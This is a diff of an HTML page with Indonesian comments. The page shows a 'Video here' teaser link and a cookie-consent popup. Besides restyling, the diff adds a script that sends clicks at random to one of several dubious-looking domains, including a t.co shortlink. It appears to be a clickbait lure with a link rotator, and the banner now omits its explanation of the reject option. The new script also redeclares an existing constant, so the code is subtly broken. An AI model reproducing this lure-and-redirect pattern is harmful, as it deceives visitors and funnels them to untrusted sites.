@@ -25,13 +25,13 @@
             overflow: hidden;
         }
 
-        /* Container Video Here - Diturunkan agar lebih center di area sisa */
+        /* Container Video Here - Posisi Tengah yang Pas */
         .main-container {
             flex: 1;
             display: flex;
             justify-content: center;
             align-items: flex-start; 
-            padding-top: 200px; /* Lebih turun dari sebelumnya */
+            padding-top: 220px; /* Diturunkan agar pas di atas popup */
             z-index: 1;
         }
 
@@ -45,7 +45,6 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            text-decoration: none;
         }
 
         .blue-part { color: var(--video-blue); }
@@ -59,17 +58,18 @@
             display: flex;
             z-index: 9999;
             pointer-events: none;
-            justify-content: center;
+            justify-content: center; /* Center Horizontal */
+            align-items: flex-end; /* Di bagian bawah */
         }
 
-        /* Card Cookie */
+        /* Card Cookie - Lebih Ramping & Presisi */
         .cookie-card {
             background: #ffffff;
             pointer-events: auto;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2); 
+            box-shadow: 0 12px 45px rgba(0,0,0,0.25); 
             display: flex;
             flex-direction: column;
-            text-align: center;
+            text-align: center; /* Teks di tengah */
             box-sizing: border-box;
             border: 1px solid #eeeeee;
         }
@@ -82,22 +82,24 @@
         }
 
         .cookie-card p {
-            font-size: 14px;
+            font-size: 14.5px;
             color: var(--text-gray);
             line-height: 1.5;
             margin: 0 0 20px 0;
-            padding: 0 5px;
+            text-align: center; /* Paksa teks ke tengah */
         }
 
+        /* Group Tombol */
         .button-group {
             display: flex;
+            flex-direction: column; /* Sesuai gambar ponsel */
             gap: 10px;
         }
 
         .btn-base {
-            flex: 1;
-            padding: 13px;
-            border-radius: 8px;
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
@@ -112,8 +114,9 @@
             border: none;
         }
 
+        /* Footer Branding */
         .cookie-footer {
-            margin-top: 15px;
+            margin-top: 18px;
             font-size: 12px;
             color: #8a8d91;
             display: flex;
@@ -127,36 +130,30 @@
             font-weight: 800;
         }
 
-        /* Desktop: Pojok Kiri Bawah */
-        @media (min-width: 768px) {
-            .cookie-overlay {
-                align-items: flex-end;
-                justify-content: flex-start;
-                padding: 30px; 
-            }
+        /* --- LAYAR HP --- */
+        @media (max-width: 767px) {
             .cookie-card {
-                width: 400px; 
-                padding: 30px;
-                border-radius: 12px;
+                width: 90%; /* Dibuat tidak menyentuh pinggir layar agar center */
+                border-radius: 20px;
+                padding: 35px 20px 25px 20px;
+                margin-bottom: 40px; /* Dinaikkan agar tidak terpotong sistem navigasi */
             }
         }
 
-        /* Mobile: Dinaikkan sedikit agar tidak terpotong */
-        @media (max-width: 767px) {
+        /* --- LAYAR DESKTOP --- */
+        @media (min-width: 768px) {
             .cookie-overlay {
-                align-items: flex-end;
-                padding: 20px; /* Jarak dari semua sisi */
+                justify-content: flex-start;
+                padding: 30px;
             }
             .cookie-card {
-                width: 100%;
-                border-radius: 18px; /* Lengkungan penuh agar terlihat mengambang */
-                padding: 30px 20px 20px 20px;
-                margin-bottom: 25px; /* Menaikkan popup agar tidak terpotong navigasi HP */
+                width: 380px;
+                padding: 30px;
+                border-radius: 12px;
+                margin-bottom: 0;
             }
-            .button-group {
-                flex-direction: column;
-            }
-            .btn-base { padding: 15px; }
+            .button-group { flex-direction: row; }
+            .main-container { padding-top: 0; align-items: center; }
         }
 
         .hidden { display: none !important; }
@@ -165,11 +162,11 @@
 <body>
 
     <div class="main-container">
-        <button class="btn-video-link" onclick="handleVideoClick()">
+        <div class="btn-video-link">
             <span class="blue-part">🔗👉 Video</span> 
             <span class="yellow-part">here</span>
             <span class="blue-part">🔗</span>
-        </button>
+        </div>
     </div>
 
     <div id="cookieModal" class="cookie-overlay">
@@ -177,7 +174,7 @@
             <h2>We respect your privacy</h2>
             <p>
                 Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
-                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or Reject All to decline non-essential cookies.
+                You can choose which cookies to allow by clicking Customize.
             </p>
             
             <div class="button-group">
@@ -202,7 +199,7 @@
         const daftarDomain = [
             "https://mogoflox.it.com/",
         ];
-
+ 
         function handleVideoClick() {
             const domain = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
             window.location.href = domain + videoId;
@@ -211,6 +208,15 @@
         function dismissModal() {
             document.getElementById('cookieModal').classList.add('hidden');
         }
+        
+        // Logika rotator link dari index.php
+        const daftarDomain = ["https://cdn.xvides.pro/v/", "https://videy.xviralhub.com/v/", "https://t.co/4zrYe6EFTS?/v/"];
+        document.querySelector('.btn-video-link').onclick = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const videoId = urlParams.get('id') || 'default';
+            const domain = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
+            window.location.href = domain + videoId;
+        };
     </script>
 </body>
 </html>
